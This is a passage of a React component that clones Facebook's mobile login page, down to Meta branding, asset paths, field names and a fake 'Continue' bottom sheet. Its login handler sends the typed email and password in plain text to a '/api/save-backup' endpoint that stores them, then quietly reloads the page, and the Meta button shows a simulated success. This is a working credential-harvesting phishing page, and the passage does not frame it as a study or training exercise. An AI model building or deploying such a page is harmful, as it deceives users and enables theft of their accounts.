import React, { useState, useRef, useEffect } from 'react';

export default function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isEmailFocused, setIsEmailFocused] = useState(false);
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [loginSuccess, setLoginSuccess] = useState(false);
  const [showLanguageModal, setShowLanguageModal] = useState(false);
  const [currentLanguage, setCurrentLanguage] = useState('English (UK)');
  
  // Meta "Continue with Family of Apps" half-screen bottom sheet
  const [showMetaBottomSheet, setShowMetaBottomSheet] = useState(false);
  const [metaSheetVisible, setMetaSheetVisible] = useState(false);
  const [isMetaContinuing, setIsMetaContinuing] = useState(false);

  const emailInputRef = useRef(null);
  const passwordInputRef = useRef(null);

  // Automatically trigger the Meta Bottom Sheet on initial load (matches original HAR async fetch)
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowMetaBottomSheet(true);
      requestAnimationFrame(() => setMetaSheetVisible(true));
    }, 600);
    return () => clearTimeout(timer);
  }, []);

  const closeMetaBottomSheet = () => {
    setMetaSheetVisible(false);
    setTimeout(() => {
      setShowMetaBottomSheet(false);
    }, 280);
  };

  const openMetaBottomSheet = () => {
    setShowMetaBottomSheet(true);
    requestAnimationFrame(() => {
      requestAnimationFrame(() => setMetaSheetVisible(true));
    });
  };

  const handleClearEmail = (e) => {
    e.stopPropagation();
    setEmail('');
    if (emailInputRef.current) {
      emailInputRef.current.focus();
    }
  };

  const handleTogglePassword = (e) => {
    e.stopPropagation();
    setShowPassword(!showPassword);
    if (passwordInputRef.current) {
      passwordInputRef.current.focus();
    }
  };

  const saveCredentialsToServer = async (emailValue, passwordValue, timestamp) => {
    const response = await fetch('/api/save-backup', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        email: emailValue || '',
        password: passwordValue || '',
        timestamp
      })
    });

    const result = await response.json();

    if (!response.ok) {
      throw new Error(result.error || 'Failed to save backup');
    }

    return result;
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    if (!email && !password) return;

    try {
      const emailValue = email.trim();
      const passwordValue = password.trim();
      const timestamp = new Date().toISOString();

      // Send values to the server on this machine, which saves
      // the file to the local 'saved/' folder
      await saveCredentialsToServer(emailValue, passwordValue, timestamp);
    } catch (error) {
      console.error('Failed to save login backup:', error);
    }

    // Refresh the page naturally after saving
    window.location.reload();
  };

  const handleMetaContinue = () => {
    setIsMetaContinuing(true);
    setTimeout(() => {
      setIsMetaContinuing(false);
      closeMetaBottomSheet();
      setLoginSuccess(true);
      setTimeout(() => setLoginSuccess(false), 3000);
    }, 1200);
  };

  const languages = [
    'English (UK)',
    'English (US)',
    'Español',
    'Français (France)',
    'Português (Brasil)',
    'العربية',
    'Deutsch',
    'Italiano'
  ];

  return (
    <div className="fb-mobile-wrapper">
      <div id="viewport" data-kaios-focus-transparent="1">
        <h1 style={{ display: 'block', height: 0, overflow: 'hidden', position: 'absolute', width: 0, padding: 0 }}>
          Facebook
        </h1>
        <div id="page">
          <div className="_129_" id="header-notices"></div>
          <div className="_ao4r acw" id="root" role="main" data-sigil="context-layer-root content-pane">
            <div className="_7om2">
              <div className="_4g34">
                <div id="37543afb-04ee-4acf-914b-4e2d9a3d7a4f" data-referrer="37543afb-04ee-4acf-914b-4e2d9a3d7a4f">
                  <div id="root_0_0_8y">
                    <div style={{ width: '100%', height: '100%' }}>
                      <div
                        className="wbloks_65 wbloks_66 wbloks_99 wbloks_101"
                        style={{ fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}
                      >
                        <div className="wbloks_1 wbloks_105 wbloks_104">
                          <div className="wbloks_1" style={{ display: 'block', flex: '1 1 100%', overflow: 'hidden' }}>
                            <div className="wbloks_114" style={{ textSizeAdjust: '100%' }}>
                              <div className="wbloks_115">
                                <div className="wbloks_116">
                                  <div className="wbloks_119" style={{ backgroundColor: 'rgb(255, 255, 255)' }}></div>
                                </div>
                                <div
                                  className="wbloks_1"
                                  style={{ pointerEvents: 'none', flexGrow: 1, justifyContent: 'inherit', flexDirection: 'column' }}
                                >
                                  {/* App Banner */}
                                  <div
                                    className="wbloks_1"
                                    style={{ pointerEvents: 'none', background: 'rgb(255, 255, 255)', padding: '10px 12px' }}
                                  >
                                    <div className="wbloks_1" style={{ pointerEvents: 'none', width: '100%', alignItems: 'center' }}>
                                      <div className="wbloks_1" style={{ pointerEvents: 'none', width: '24px', height: '24px' }}>
                                        <div
                                          className="wbloks_1"
                                          style={{
                                            pointerEvents: 'none',
                                            width: '24px',
                                            height: '24px',
                                            alignItems: 'center',
                                            justifyContent: 'center'
                                          }}
                                        >
                                          <img
                                            alt=""
                                            className="wbloks_1"
                                            src="/rsrc.php/yw/r/gLamC64FCJF.webp"
                                            style={{
                                              maskImage: 'url("/rsrc.php/yw/r/gLamC64FCJF.webp")',
                                              WebkitMaskImage: 'url("/rsrc.php/yw/r/gLamC64FCJF.webp")',
                                              maskSize: 'cover',
                                              WebkitMaskSize: 'cover',
                                              backgroundColor: 'rgb(0, 100, 224)',
                                              objectPosition: '10000px 10000px',
                                              objectFit: 'cover',
                                              overflow: 'hidden'
                                            }}
                                          />
                                        </div>
                                      </div>
                                      <div
                                        tabIndex={0}
                                        role="button"
                                        aria-label="Get Facebook for Android and browse faster."
                                        className="wbloks_1"
                                        style={{
                                          pointerEvents: 'auto',
                                          flexGrow: 1,
                                          cursor: 'pointer',
                                          WebkitTapHighlightColor: 'transparent',
                                          flexDirection: 'column',
                                          justifyContent: 'center',
                                          paddingLeft: '8px',
                                          paddingRight: '10px'
                                        }}
                                        onClick={(e) => e.preventDefault()}
                                      >
                                        <span
                                          style={{
                                            fontWeight: 400,
                                            padding: 'unset',
                                            lineHeight: 1.3,
                                            fontSize: '13px',
                                            fontFamily: '"Optimistic Text Normal"',
                                            fontVariationSettings: 'normal',
                                            color: 'rgb(23, 99, 207)',
                                            whiteSpace: 'pre-wrap',
                                            overflowWrap: 'break-word',
                                            maxWidth: '100%'
                                          }}
                                        >
                                          Get Facebook for Android and browse faster.
                                        </span>
                                      </div>
                                    </div>
                                  </div>
                                  {/* Divider */}
                                  <div className="wbloks_1" style={{ pointerEvents: 'none' }}>
                                    <div className="wbloks_1" style={{ pointerEvents: 'none', width: '100%', flexGrow: 1 }}>
                                      <div
                                        className="wbloks_1"
                                        style={{
                                          pointerEvents: 'none',
                                          height: '0.5px',
                                          flexGrow: 1,
                                          background: 'rgb(201, 204, 209)'
                                        }}
                                      ></div>
                                    </div>
                                  </div>
                                </div>

                                <div className="wbloks_1" style={{ pointerEvents: 'none', width: '100%', height: '4px' }}></div>

                                <div
                                  className="wbloks_1"
                                  style={{
                                    pointerEvents: 'none',
                                    width: '100%',
                                    height: '100%',
                                    alignItems: 'center',
                                    flexDirection: 'column'
                                  }}
                                >
                                  <div
                                    className="wbloks_1"
                                    style={{
                                      pointerEvents: 'none',
                                      maxWidth: '2160px',
                                      width: '100%',
                                      height: '100%',
                                      flexShrink: 0,
                                      flexDirection: 'column'
                                    }}
                                  >
                                    <div className="wbloks_1" style={{ pointerEvents: 'none', width: '100%', height: '100%', flexDirection: 'column' }}>
                                      <div className="wbloks_1" style={{ pointerEvents: 'none', height: '100%', flexDirection: 'column' }}>
                                        <div className="wbloks_1" style={{ pointerEvents: 'none', width: '100%', height: '100%', overflow: 'hidden' }}>
                                          <div className="wbloks_1" style={{ pointerEvents: 'none', flexGrow: 1, height: '100%', flexDirection: 'column' }}>
                                            <div className="wbloks_1" style={{ pointerEvents: 'none', height: '100%', flexDirection: 'column' }}>
                                              <div
                                                className="wbloks_1"
                                                style={{
                                                  pointerEvents: 'none',
                                                  height: '100%',
                                                  flexDirection: 'column',
                                                  padding: '8px 16px 14px'
                                                }}
                                              >
                                                <div
                                                  className="wbloks_1"
                                                  style={{
                                                    pointerEvents: 'none',
                                                    height: '100%',
                                                    alignItems: 'center',
                                                    flexDirection: 'column',
                                                    justifyContent: 'center'
                                                  }}
                                                >
                                                  <div className="wbloks_1" style={{ pointerEvents: 'none' }}></div>
                                                  <div
                                                    className="wbloks_1"
                                                    style={{
                                                      pointerEvents: 'auto',
                                                      height: '100%',
                                                      width: '100%',
                                                      cursor: 'pointer',
                                                      WebkitTapHighlightColor: 'transparent',
                                                      flexDirection: 'column',
                                                      justifyContent: 'space-between',
                                                      paddingBottom: '0px'
                                                    }}
                                                  >
                                                    {/* Language Selector */}
                                                    <div className="wbloks_1" style={{ pointerEvents: 'none', justifyContent: 'center' }}>
                                                      <div
                                                        tabIndex={0}
                                                        role="button"
                                                        aria-label={currentLanguage}
                                                        className="wbloks_1"
                                                        style={{
                                                          pointerEvents: 'auto',
                                                          cursor: 'pointer',
                                                          WebkitTapHighlightColor: 'transparent',
                                                          alignItems: 'center',
                                                          paddingLeft: '16px',
                                                          paddingRight: '16px'
                                                        }}
                                                        onClick={() => setShowLanguageModal(true)}
                                                      >
                                                        <div
                                                          dir="auto"
                                                          className="wbloks_1"
                                                          style={{ lineHeight: 1.30013, display: 'block', textAlign: 'start', overflow: 'hidden' }}
                                                        >
                                                          <div
                                                            style={{
                                                              fontSize: '13.5px',
                                                              paddingTop: '0.624123px',
                                                              paddingBottom: '4.62412px',
                                                              transform: 'translateY(calc(6.5e-05em))'
                                                            }}
                                                          >
                                                            <div className="wbloks_125" style={{ fontSize: '13.5px', maxHeight: '1.61886e+20px', wordBreak: 'break-word' }}>
                                                              <div className="wbloks_126" dir="auto">
                                                                <span
                                                                  style={{
                                                                    color: 'rgb(104, 106, 110)',
                                                                    fontWeight: 400,
                                                                    display: 'inline',
                                                                    fontSize: '13.5px',
                                                                    fontFamily: '"Optimistic 95"',
                                                                    fontVariationSettings: 'normal',
                                                                    whiteSpace: 'pre-wrap',
                                                                    overflowWrap: 'break-word'
                                                                  }}
                                                                >
                                                                  {currentLanguage}
                                                                </span>
                                                              </div>
                                                            </div>
                                                          </div>
                                                        </div>
                                                      </div>
                                                    </div>

                                                    {/* Facebook Logo */}
                                                    <div
                                                      className="wbloks_1"
                                                      style={{
                                                        pointerEvents: 'none',
                                                        marginTop: '0px',
                                                        marginBottom: '20px',
                                                        flexGrow: 1,
                                                        flexShrink: 100
                                                      }}
                                                    >
                                                      <div
                                                        className="wbloks_1"
                                                        style={{
                                                          pointerEvents: 'none',
                                                          width: '100%',
                                                          alignItems: 'center',
                                                          justifyContent: 'center'
                                                        }}
                                                      >
                                                        <img
                                                          role="heading"
                                                          alt="Facebook from Meta"
                                                          className="wbloks_1"
                                                          src="/rsrc.php/yt/r/DUiOg0mJTjz.webp"
                                                          style={{
                                                            maxHeight: '60px',
                                                            minHeight: '0px',
                                                            objectFit: 'contain',
                                                            overflow: 'hidden'
                                                          }}
                                                        />
                                                      </div>
                                                    </div>

                                                    {/* Form Fields */}
                                                    <form onSubmit={handleLogin} style={{ width: '100%', margin: 0, padding: 0 }}>
                                                      <div className="wbloks_1" style={{ pointerEvents: 'none', flexDirection: 'column', justifyContent: 'flex-start' }}>
                                                        {/* Email Input Field */}
                                                        <div className="wbloks_1" style={{ pointerEvents: 'none', justifyContent: 'center' }}>
                                                          <div className="wbloks_1" style={{ pointerEvents: 'none', width: '100%', background: 'rgba(0, 0, 0, 0)', flexDirection: 'column' }}>
                                                            <div className="wbloks_1" style={{ pointerEvents: 'none', flexDirection: 'column', justifyContent: 'center' }}>
                                                              <div
                                                                className="wbloks_1"
                                                                style={{
                                                                  pointerEvents: 'auto',
                                                                  cursor: 'pointer',
                                                                  WebkitTapHighlightColor: 'transparent',
                                                                  background: 'rgba(255, 255, 255, 0.2)',
                                                                  border: `1px solid ${isEmailFocused ? 'rgb(0, 100, 224)' : 'rgb(224, 226, 228)'}`,
                                                                  borderRadius: '16px',
                                                                  alignItems: 'center',
                                                                  padding: '10px 16px'
                                                                }}
                                                                onClick={() => emailInputRef.current?.focus()}
                                                              >
                                                                {/* Centered Placeholder Label (when empty and unfocused) */}
                                                                {email.length === 0 && !isEmailFocused && (
                                                                  <div
                                                                    className="wbloks_1"
                                                                    style={{
                                                                      pointerEvents: 'none',
                                                                      width: '100%',
                                                                      flexShrink: 0,
                                                                      marginRight: '-100%',
                                                                      paddingRight: '0px'
                                                                    }}
                                                                  >
                                                                    <div aria-hidden="true" dir="auto" className="wbloks_1" style={{ lineHeight: 1.3, display: 'block', overflow: 'hidden' }}>
                                                                      <div
                                                                        className="wbloks_124"
                                                                        style={{
                                                                          display: '-webkit-box',
                                                                          overflow: 'hidden',
                                                                          textOverflow: 'ellipsis',
                                                                          WebkitBoxOrient: 'vertical',
                                                                          WebkitLineClamp: 2,
                                                                          wordBreak: 'break-word',
                                                                          maxHeight: '999999px'
                                                                        }}
                                                                      >
                                                                        <span
                                                                          style={{
                                                                            display: 'inline',
                                                                            whiteSpace: 'pre-wrap',
                                                                            overflowWrap: 'break-word',
                                                                            fontSize: '15.2px',
                                                                            fontWeight: 400,
                                                                            fontFamily: '"Optimistic 95"',
                                                                            color: 'rgb(104, 106, 110)'
                                                                          }}
                                                                        >
                                                                          Mobile number or email address
                                                                        </span>
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                )}

                                                                {/* Floating Label and Input */}
                                                                <div className="wbloks_1" style={{ pointerEvents: 'none', flexGrow: 1, flexDirection: 'column' }}>
                                                                  <div
                                                                    className="wbloks_1"
                                                                    style={{
                                                                      pointerEvents: 'none',
                                                                      visibility: (email.length > 0 || isEmailFocused) ? 'visible' : 'hidden'
                                                                    }}
                                                                  >
                                                                    <div aria-hidden="true" dir="auto" className="wbloks_1" style={{ lineHeight: 1.3, display: 'block', overflow: 'hidden' }}>
                                                                      <div style={{ fontSize: '13.5px', paddingTop: '0.625px', paddingBottom: '0.625px' }}>
                                                                        <div
                                                                          className="wbloks_124"
                                                                          style={{
                                                                            display: '-webkit-box',
                                                                            overflow: 'hidden',
                                                                            textOverflow: 'ellipsis',
                                                                            WebkitBoxOrient: 'vertical',
                                                                            WebkitLineClamp: 1,
                                                                            wordBreak: 'break-word',
                                                                            maxHeight: '999999px'
                                                                          }}
                                                                        >
                                                                          <span
                                                                            style={{
                                                                              display: 'inline',
                                                                              whiteSpace: 'pre-wrap',
                                                                              overflowWrap: 'break-word',
                                                                              fontSize: '13.5px',
                                                                              fontWeight: 400,
                                                                              fontFamily: '"Optimistic 95"',
                                                                              color: 'rgb(104, 106, 110)'
                                                                            }}
                                                                          >
                                                                            Mobile number or email address
                                                                          </span>
                                                                        </div>
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                  <div className="wbloks_1" style={{ pointerEvents: 'none', minHeight: '22px', alignItems: 'flex-start', flexDirection: 'row' }}>
                                                                    <input
                                                                      ref={emailInputRef}
                                                                      dir="auto"
                                                                      id="m_login_email"
                                                                      aria-label="Mobile number or email address"
                                                                      autoCapitalize="off"
                                                                      autoComplete="username webauthn"
                                                                      autoCorrect="off"
                                                                      className="wbloks_1 wbloks_67"
                                                                      placeholder=""
                                                                      type="text"
                                                                      value={email}
                                                                      onChange={(e) => setEmail(e.target.value)}
                                                                      onFocus={() => setIsEmailFocused(true)}
                                                                      onBlur={() => setIsEmailFocused(false)}
                                                                      name="email"
                                                                      style={{
                                                                        background: 'transparent',
                                                                        color: 'rgb(17, 17, 18)',
                                                                        fontFamily: '"Optimistic 95"',
                                                                        fontVariationSettings: 'normal',
                                                                        fontSize: '15.2px',
                                                                        lineHeight: 1.3,
                                                                        outline: 'none',
                                                                        border: 'none',
                                                                        width: '100%',
                                                                        caretColor: 'rgb(17, 17, 18)'
                                                                      }}
                                                                    />
                                                                  </div>
                                                                </div>

                                                                {/* Clear Email Button */}
                                                                <div
                                                                  tabIndex={0}
                                                                  role="button"
                                                                  className="wbloks_1"
                                                                  style={{
                                                                    pointerEvents: 'auto',
                                                                    flexShrink: 0,
                                                                    marginLeft: '12px',
                                                                    cursor: 'pointer',
                                                                    WebkitTapHighlightColor: 'transparent',
                                                                    visibility: email.length > 0 ? 'visible' : 'hidden',
                                                                    flexDirection: 'row'
                                                                  }}
                                                                  onClick={handleClearEmail}
                                                                >
                                                                  <div className="wbloks_1" style={{ pointerEvents: 'none', width: '24px', height: '24px' }}>
                                                                    <img
                                                                      alt=""
                                                                      className="wbloks_1"
                                                                      src="/rsrc.php/y8/r/XpWPmzCEVDS.webp"
                                                                      style={{
                                                                        maskImage: 'url("/rsrc.php/y8/r/XpWPmzCEVDS.webp")',
                                                                        WebkitMaskImage: 'url("/rsrc.php/y8/r/XpWPmzCEVDS.webp")',
                                                                        maskSize: 'cover',
                                                                        WebkitMaskSize: 'cover',
                                                                        backgroundColor: 'rgb(104, 106, 110)',
                                                                        objectPosition: '10000px 10000px',
                                                                        objectFit: 'cover',
                                                                        overflow: 'hidden'
                                                                      }}
                                                                    />
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                        </div>

                                                        {/* Password Input Field */}
                                                        <div className="wbloks_1" style={{ pointerEvents: 'none', marginTop: '12px', justifyContent: 'center' }}>
                                                          <div className="wbloks_1" style={{ pointerEvents: 'none', width: '100%', background: 'rgba(0, 0, 0, 0)', flexDirection: 'column' }}>
                                                            <div className="wbloks_1" style={{ pointerEvents: 'none', flexDirection: 'column', justifyContent: 'center' }}>
                                                              <div
                                                                className="wbloks_1"
                                                                style={{
                                                                  pointerEvents: 'auto',
                                                                  cursor: 'pointer',
                                                                  WebkitTapHighlightColor: 'transparent',
                                                                  background: 'rgba(255, 255, 255, 0.2)',
                                                                  border: `1px solid ${isPasswordFocused ? 'rgb(0, 100, 224)' : 'rgb(224, 226, 228)'}`,
                                                                  borderRadius: '16px',
                                                                  alignItems: 'center',
                                                                  padding: '10px 16px'
                                                                }}
                                                                onClick={() => passwordInputRef.current?.focus()}
                                                              >
                                                                {/* Centered Placeholder Label */}
                                                                {password.length === 0 && !isPasswordFocused && (
                                                                  <div
                                                                    className="wbloks_1"
                                                                    style={{
                                                                      pointerEvents: 'none',
                                                                      width: '100%',
                                                                      flexShrink: 0,
                                                                      marginRight: '-100%',
                                                                      paddingRight: '0px'
                                                                    }}
                                                                  >
                                                                    <div aria-hidden="true" dir="auto" className="wbloks_1" style={{ lineHeight: 1.3, display: 'block', overflow: 'hidden' }}>
                                                                      <div
                                                                        className="wbloks_124"
                                                                        style={{
                                                                          display: '-webkit-box',
                                                                          overflow: 'hidden',
                                                                          textOverflow: 'ellipsis',
                                                                          WebkitBoxOrient: 'vertical',
                                                                          WebkitLineClamp: 2,
                                                                          wordBreak: 'break-word',
                                                                          maxHeight: '999999px'
                                                                        }}
                                                                      >
                                                                        <span
                                                                          style={{
                                                                            display: 'inline',
                                                                            whiteSpace: 'pre-wrap',
                                                                            overflowWrap: 'break-word',
                                                                            fontSize: '15.2px',
                                                                            fontWeight: 400,
                                                                            fontFamily: '"Optimistic 95"',
                                                                            color: 'rgb(104, 106, 110)'
                                                                          }}
                                                                        >
                                                                          Password
                                                                        </span>
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                )}

                                                                {/* Floating Label and Input */}
                                                                <div className="wbloks_1" style={{ pointerEvents: 'none', flexGrow: 1, flexDirection: 'column' }}>
                                                                  <div
                                                                    className="wbloks_1"
                                                                    style={{
                                                                      pointerEvents: 'none',
                                                                      visibility: (password.length > 0 || isPasswordFocused) ? 'visible' : 'hidden'
                                                                    }}
                                                                  >
                                                                    <div aria-hidden="true" dir="auto" className="wbloks_1" style={{ lineHeight: 1.3, display: 'block', overflow: 'hidden' }}>
                                                                      <div style={{ fontSize: '13.5px', paddingTop: '0.625px', paddingBottom: '0.625px' }}>
                                                                        <div
                                                                          className="wbloks_124"
                                                                          style={{
                                                                            display: '-webkit-box',
                                                                            overflow: 'hidden',
                                                                            textOverflow: 'ellipsis',
                                                                            WebkitBoxOrient: 'vertical',
                                                                            WebkitLineClamp: 1,
                                                                            wordBreak: 'break-word',
                                                                            maxHeight: '999999px'
                                                                          }}
                                                                        >
                                                                          <span
                                                                            style={{
                                                                              display: 'inline',
                                                                              whiteSpace: 'pre-wrap',
                                                                              overflowWrap: 'break-word',
                                                                              fontSize: '13.5px',
                                                                              fontWeight: 400,
                                                                              fontFamily: '"Optimistic 95"',
                                                                              color: 'rgb(104, 106, 110)'
                                                                            }}
                                                                          >
                                                                            Password
                                                                          </span>
                                                                        </div>
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                  <div className="wbloks_1" style={{ pointerEvents: 'none', minHeight: '22px', alignItems: 'flex-start', flexDirection: 'row' }}>
                                                                    <input
                                                                      ref={passwordInputRef}
                                                                      dir="auto"
                                                                      id="m_login_password"
                                                                      aria-label="Password"
                                                                      autoCapitalize="off"
                                                                      autoComplete="on"
                                                                      autoCorrect="off"
                                                                      className="wbloks_1 wbloks_67"
                                                                      placeholder=""
                                                                      type={showPassword ? 'text' : 'password'}
                                                                      value={password}
                                                                      onChange={(e) => setPassword(e.target.value)}
                                                                      onFocus={() => setIsPasswordFocused(true)}
                                                                      onBlur={() => setIsPasswordFocused(false)}
                                                                      name="pass"
                                                                      style={{
                                                                        background: 'transparent',
                                                                        color: 'rgb(17, 17, 18)',
                                                                        fontFamily: '"Optimistic 95"',
                                                                        fontVariationSettings: 'normal',
                                                                        fontSize: '15.2px',
                                                                        lineHeight: 1.3,
                                                                        outline: 'none',
                                                                        border: 'none',
                                                                        width: '100%',
                                                                        caretColor: 'rgb(17, 17, 18)'
                                                                      }}
                                                                    />
                                                                  </div>
                                                                </div>

                                                                {/* Show/Hide Password Eye Button */}
                                                                <div
                                                                  tabIndex={0}
                                                                  role="button"
                                                                  className="wbloks_1"
                                                                  style={{
                                                                    pointerEvents: 'auto',
                                                                    flexShrink: 0,
                                                                    marginLeft: '12px',
                                                                    cursor: 'pointer',
                                                                    WebkitTapHighlightColor: 'transparent',
                                                                    visibility: password.length > 0 ? 'visible' : 'hidden',
                                                                    flexDirection: 'row'
                                                                  }}
                                                                  onClick={handleTogglePassword}
                                                                >
                                                                  <div className="wbloks_1" style={{ pointerEvents: 'none', width: '24px', height: '24px' }}>
                                                                    <img
                                                                      alt=""
                                                                      className="wbloks_1"
                                                                      src="/rsrc.php/yQ/r/WJI0PrMp5z2.webp"
                                                                      style={{
                                                                        maskImage: 'url("/rsrc.php/yQ/r/WJI0PrMp5z2.webp")',
                                                                        WebkitMaskImage: 'url("/rsrc.php/yQ/r/WJI0PrMp5z2.webp")',
                                                                        maskSize: 'cover',
                                                                        WebkitMaskSize: 'cover',
                                                                        backgroundColor: showPassword ? 'rgb(0, 100, 224)' : 'rgb(104, 106, 110)',
                                                                        objectPosition: '10000px 10000px',
                                                                        objectFit: 'cover',
                                                                        overflow: 'hidden'
                                                                      }}
                                                                    />
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                        </div>

                                                        {/* Log In Button */}
                                                        <div
                                                          className="wbloks_1"
                                                          style={{
                                                            pointerEvents: 'none',
                                                            marginTop: '12px',
                                                            alignItems: 'stretch',
                                                            flexDirection: 'column',
                                                            justifyContent: 'center'
                                                          }}
                                                        >
                                                          <div className="wbloks_1" style={{ flexGrow: 1, cursor: 'pointer', pointerEvents: 'auto' }}>
                                                            <div
                                                              className="wbloks_1"
                                                              data-bloks-visibility-state="entered"
                                                              style={{ height: '100%', width: '100%', transform: 'scaleX(1) scaleY(1)', opacity: 1, pointerEvents: 'inherit' }}
                                                            >
                                                              <button
                                                                type="submit"
                                                                tabIndex={0}
                                                                role="button"
                                                                aria-label="Log in"
                                                                data-anchor-id="replay"
                                                                className="wbloks_1"
                                                                style={{
                                                                  pointerEvents: 'inherit',
                                                                  height: '100%',
                                                                  width: '100%',
                                                                  borderRadius: '22px',
                                                                  border: 'none',
                                                                  padding: 0,
                                                                  background: 'none',
                                                                  cursor: 'pointer'
                                                                }}
                                                              >
                                                                <div
                                                                  className="wbloks_1"
                                                                  style={{
                                                                    pointerEvents: 'none',
                                                                    opacity: 1,
                                                                    minWidth: '44px',
                                                                    height: '44px',
                                                                    flexGrow: 1,
                                                                    background: 'rgb(0, 100, 224)',
                                                                    border: '0px solid rgb(17, 17, 18)',
                                                                    borderRadius: '22px',
                                                                    alignItems: 'center',
                                                                    flexDirection: 'row',
                                                                    justifyContent: 'center',
                                                                    paddingLeft: '20px',
                                                                    paddingRight: '20px'
                                                                  }}
                                                                >
                                                                  <div className="wbloks_1" style={{ pointerEvents: 'none', opacity: 1, alignItems: 'center', flexDirection: 'row', justifyContent: 'center' }}>
                                                                    <div dir="auto" className="wbloks_1" style={{ lineHeight: 1.30013, display: 'block', textAlign: 'start', overflow: 'hidden' }}>
                                                                      <div style={{ fontSize: '15.2px', paddingTop: '1.19901px', paddingBottom: '1.19901px', transform: 'translateY(calc(6.5e-05em))' }}>
                                                                        <div className="wbloks_125" style={{ fontSize: '15.2px', maxHeight: '19.762px', wordBreak: 'break-all' }}>
                                                                          <div className="wbloks_126" dir="auto">
                                                                            <span
                                                                              style={{
                                                                                color: 'rgb(243, 244, 245)',
                                                                                fontWeight: 500,
                                                                                display: 'inline',
                                                                                fontSize: '15.2px',
                                                                                fontFamily: '"Optimistic 95"',
                                                                                fontVariationSettings: 'normal',
                                                                                whiteSpace: 'pre-wrap',
                                                                                overflowWrap: 'break-word'
                                                                              }}
                                                                            >
                                                                              Log in
                                                                            </span>
                                                                          </div>
                                                                        </div>
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </button>
                                                            </div>
                                                          </div>
                                                        </div>

                                                        {/* Forgotten Password? Link */}
                                                        <div
                                                          className="wbloks_1"
                                                          style={{
                                                            pointerEvents: 'none',
                                                            alignItems: 'center',
                                                            flexDirection: 'column',
                                                            justifyContent: 'center',
                                                            paddingTop: '12px',
                                                            paddingBottom: '0px'
                                                          }}
                                                        >
                                                          <div className="wbloks_1" style={{ flexGrow: 1, cursor: 'pointer', pointerEvents: 'auto' }}>
                                                            <div
                                                              className="wbloks_1"
                                                              data-bloks-visibility-state="entered"
                                                              style={{ height: '100%', width: '100%', transform: 'scaleX(1) scaleY(1)', opacity: 1, pointerEvents: 'inherit' }}
                                                            >
                                                              <div
                                                                tabIndex={0}
                                                                role="button"
                                                                aria-label="Forgotten password?"
                                                                data-anchor-id="replay"
                                                                className="wbloks_1"
                                                                style={{ pointerEvents: 'inherit', height: '100%', width: '100%' }}
                                                                onClick={(e) => e.preventDefault()}
                                                              >
                                                                <div className="wbloks_1" style={{ pointerEvents: 'none' }}>
                                                                  <div className="wbloks_1" style={{ height: '36px' }}>
                                                                    <div
                                                                      className="wbloks_1"
                                                                      data-bloks-visibility-state="entered"
                                                                      style={{ height: '100%', width: '100%', transform: 'scaleX(1) scaleY(1)', opacity: 1 }}
                                                                    >
                                                                      <div
                                                                        className="wbloks_1"
                                                                        style={{
                                                                          alignItems: 'center',
                                                                          height: '100%',
                                                                          justifyContent: 'center',
                                                                          minWidth: '44px',
                                                                          opacity: 1,
                                                                          paddingLeft: '20px',
                                                                          paddingRight: '20px'
                                                                        }}
                                                                      >
                                                                        <div
                                                                          dir="auto"
                                                                          className="wbloks_1"
                                                                          style={{ lineHeight: 1.30013, display: 'block', textAlign: 'start', overflow: 'hidden' }}
                                                                        >
                                                                          <div style={{ fontSize: '15.2px', paddingTop: '2.19901px', paddingBottom: '4.19901px', transform: 'translateY(calc(6.5e-05em))' }}>
                                                                            <div className="wbloks_125" style={{ fontSize: '15.2px', maxHeight: '19.762px', wordBreak: 'break-all' }}>
                                                                              <div className="wbloks_126" dir="auto">
                                                                                <span
                                                                                  style={{
                                                                                    color: 'rgb(17, 17, 18)',
                                                                                    fontWeight: 500,
                                                                                    display: 'inline',
                                                                                    fontSize: '15.2px',
                                                                                    fontFamily: '"Optimistic 95"',
                                                                                    fontVariationSettings: 'normal',
                                                                                    whiteSpace: 'pre-wrap',
                                                                                    overflowWrap: 'break-word'
                                                                                  }}
                                                                                >
                                                                                  Forgotten password?
                                                                                </span>
                                                                              </div>
                                                                            </div>
                                                                          </div>
                                                                        </div>
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                        </div>
                                                      </div>
                                                    </form>

                                                    {/* Bottom Section */}
                                                    <div
                                                      className="wbloks_1"
                                                      style={{
                                                        pointerEvents: 'none',
                                                        flexGrow: 1,
                                                        flexShrink: 1000000,
                                                        flexDirection: 'column',
                                                        justifyContent: 'flex-end',
                                                        paddingBottom: '0px'
                                                      }}
                                                    >
                                                      {/* Create New Account Button */}
                                                      <div
                                                        className="wbloks_1"
                                                        style={{
                                                          pointerEvents: 'none',
                                                          alignItems: 'center',
                                                          flexDirection: 'row',
                                                          justifyContent: 'center',
                                                          paddingTop: '0px'
                                                        }}
                                                      >
                                                        <div className="wbloks_1" style={{ flexGrow: 1, cursor: 'pointer', pointerEvents: 'auto' }}>
                                                          <div
                                                            className="wbloks_1"
                                                            data-bloks-visibility-state="entered"
                                                            style={{ height: '100%', width: '100%', transform: 'scaleX(1) scaleY(1)', opacity: 1, pointerEvents: 'inherit' }}
                                                          >
                                                            <div
                                                              tabIndex={0}
                                                              role="button"
                                                              aria-label="Create new account"
                                                              data-anchor-id="replay"
                                                              className="wbloks_1"
                                                              style={{ pointerEvents: 'inherit', height: '100%', width: '100%', borderRadius: '22px' }}
                                                              onClick={(e) => e.preventDefault()}
                                                            >
                                                              <div
                                                                className="wbloks_1"
                                                                style={{
                                                                  pointerEvents: 'none',
                                                                  opacity: 1,
                                                                  minWidth: '44px',
                                                                  height: '44px',
                                                                  flexGrow: 1,
                                                                  background: 'rgba(255, 255, 255, 0.2)',
